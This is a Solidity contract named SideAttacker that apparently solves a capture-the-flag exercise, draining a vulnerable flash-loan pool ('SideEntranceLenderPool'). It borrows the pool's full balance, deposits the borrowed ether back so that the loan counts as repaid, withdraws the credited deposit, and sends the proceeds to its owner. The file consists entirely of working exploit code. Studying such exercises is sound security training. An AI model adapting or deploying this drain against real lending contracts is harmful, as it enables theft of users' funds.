pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "src/side-entrance/SideEntranceLenderPool.sol";
import "forge-std/Test.sol";

contract SideAttacker is IFlashLoanEtherReceiver {

    SideEntranceLenderPool public LenderPool;
    uint256 internal constant ETHER_IN_POOL  = 1000 ether;
    address public owner;

    constructor(address lenderPoolAddr) {
        owner = msg.sender;
        console2.log("starting constructor");
        LenderPool = SideEntranceLenderPool(lenderPoolAddr);       

    }

    function flashLoan() external {
        uint256 lenderBalance = address(LenderPool).balance;
        console2.log("executing flash loan of", lenderBalance);
        LenderPool.flashLoan(lenderBalance);
        LenderPool.withdraw();
        console2.log("withdrawn");
    }

    function withdrawPrize() external {
        require(msg.sender==owner, "Not the owner");
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable {
        console2.log("message value of", msg.value);
        LenderPool.deposit{value:  msg.value}();
    }

    receive() external payable {}

}